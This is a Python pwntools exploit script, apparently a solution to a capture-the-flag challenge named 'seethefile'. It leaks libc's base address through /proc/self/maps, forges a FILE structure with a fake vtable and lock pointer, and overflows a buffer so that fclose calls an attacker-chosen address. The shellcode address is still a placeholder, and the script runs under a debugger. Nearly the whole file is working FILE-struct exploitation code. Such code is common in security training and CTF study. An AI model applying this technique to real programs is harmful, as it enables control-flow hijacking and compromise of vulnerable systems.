from pwn import *

seethefile = ELF('seethefile')
libc = ELF('libc_32.so.6')


class Offsets:
    VTABLE_FCLOSE = 0x8
    LOCK = 0x48
    VTABLE = 0x94


class Addresses:
    MAGICBUF = 0x0804B0C0
    SHELLCODE = 0x41414141
    NULL_AREA = MAGICBUF + 0x48 + 4


class Files:
    VMMAP_FILE = '/proc/self/maps'
    STDIN_FILE = '/proc/self/fd/0'


class Prompts:
    MENU = 'MENU'
    CHOICE = 'Your choice :'
    FILE_NAME = 'What do you want to see :'


class Choices:
    OPEN = '1'
    READ = '2'
    PRINT = '3'
    CLOSE = '4'
    EXIT = '5'


p = gdb.debug(
    seethefile.path,
    '''
    b fclose+229
    c
    ''',
    env=dict(LD_PRELOAD=libc.path)
)


def leak_libc_addr():
    libc_base_addr = None
    p.sendlineafter(Prompts.CHOICE, Choices.OPEN)
    p.sendlineafter(Prompts.FILE_NAME, Files.VMMAP_FILE)

    while not libc_base_addr:
        p.sendlineafter(Prompts.CHOICE, Choices.READ)
        p.sendlineafter(Prompts.CHOICE, Choices.PRINT)
        vmmap = p.recvuntil(Prompts.MENU).decode().splitlines()
        for mapping in vmmap:
            if mapping.endswith('libc_32.so.6'):
                libc_base_addr = f'0x{mapping[:8]}'
                break

    p.sendlineafter(Prompts.CHOICE, Choices.CLOSE)
    print(f'[*] libc base address: {libc_base_addr}')
    return int(libc_base_addr, 16)


def override_file_struct():
    p.sendlineafter(Prompts.CHOICE, Choices.OPEN)
    p.sendlineafter(Prompts.FILE_NAME, Files.STDIN_FILE)
    p.sendlineafter(Prompts.CHOICE, Choices.READ)
    payload = b''

    print('[*] Setting fclose custom function handler.')
    payload += b'\0' * Offsets.VTABLE_FCLOSE + p32(Addresses.SHELLCODE)

    print('[*] Setting the FILE\'s lock member.')
    payload += b'\0' * (Offsets.LOCK - Offsets.VTABLE_FCLOSE -
                        4) + p32(Addresses.NULL_AREA)

    print('[*] Overriding the vtable of the FILE struct.')
    payload += b'\0' * (Offsets.VTABLE - Offsets.LOCK - 4) + \
        p32(Addresses.MAGICBUF)
    payload += b'\0' * 500
    p.sendline(payload)
    print('[*] Sent payload.')


def call_fclose():
    p.sendlineafter(Prompts.CHOICE, Choices.EXIT)
    print('[*] Overriding the file pointer.')
    p.sendline(b'A' * 0x20 + p32(Addresses.MAGICBUF))
    print('[*] Calling fclose on the corrupted FILE struct.')


def main():
    libc_base_addr = leak_libc_addr()
    override_file_struct()
    call_fclose()


if __name__ == "__main__":
    main()
